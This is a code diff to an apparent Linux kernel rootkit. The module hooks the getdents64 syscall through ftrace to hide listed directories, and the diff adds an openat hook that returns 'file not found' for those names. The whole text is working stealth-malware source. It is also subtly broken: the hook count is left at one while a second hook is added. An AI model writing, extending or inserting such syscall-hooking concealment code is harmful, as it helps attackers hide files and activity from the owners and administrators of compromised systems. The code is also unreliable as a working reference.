@@ -31,15 +31,18 @@ static DEFINE_SPINLOCK(hidden_dirs_lock);
 int add_hidden_dir(const char *dirname);
 int remove_hidden_dir(const char *dirname);
 int is_hidden(const char *name);
-asmlinkage int getdents64_hook(const struct pt_regs *regs);
 
-/**
- * @brief Adds a directory name to the dynamic hidden directories list.
- *
- * @dirname: The directory name to remove.
- * @return 0 on success or a negative error code on failure.
- */
-int add_hidden_dir(const char *dirname) {
+// Hooks declaration
+asmlinkage int getdents64_hook(const struct pt_regs *regs);
+asmlinkage long openat_hook(const struct pt_regs *regs);
+
+    /**
+     * @brief Adds a directory name to the dynamic hidden directories list.
+     *
+     * @dirname: The directory name to remove.
+     * @return 0 on success or a negative error code on failure.
+     */
+    int add_hidden_dir(const char *dirname) {
     struct hidden_dir_entry *entry;
 
     if (is_hidden(dirname))
@@ -114,6 +117,11 @@ int is_hidden(const char *name) {
     return hidden;
 }
 
+static bool name_is_hidden(const char *path) {
+    const char *base = strrchr(path, '/');
+    return is_hidden(base ? base + 1 : path);
+}
+
 int list_hidden_dirs(char *buf, size_t buf_size) {
     struct hidden_dir_entry *entry;
     size_t len = 0;
@@ -129,8 +137,9 @@ int list_hidden_dirs(char *buf, size_t buf_size) {
     return len;
 }
 
-// Original syscall pointer
+// Original syscall pointers
 asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs);
+asmlinkage long (*__orig_openat)(const struct pt_regs *regs);
 
 // Function to hook the getdents64 syscall
 asmlinkage int getdents64_hook(const struct pt_regs *regs) {
@@ -210,8 +219,26 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
     return new_size;
 }
 
+asmlinkage long openat_hook(const struct pt_regs *regs) {
+    char fname[1024];
+    long ret;
+
+    // Copy user path in kernelito
+    if (strncpy_from_user(fname, (char __user *)regs->si, sizeof(fname)) < 0)
+        return -EFAULT;
+
+    // Chek if it is hidden
+    if (name_is_hidden(fname))
+        return -ENOENT;
+
+    // Call original
+    ret = __orig_openat(regs);
+    return ret;
+}
+
 // Array of hooks to install.
 size_t hook_array_size = 1;
 struct ftrace_hook hooks[] = {
-    HOOK("sys_getdents64", getdents64_hook, &__orig_getdents64)
+    HOOK("sys_getdents64", getdents64_hook, &__orig_getdents64),
+    HOOK("sys_openat", openat_hook, &__orig_openat)
 };
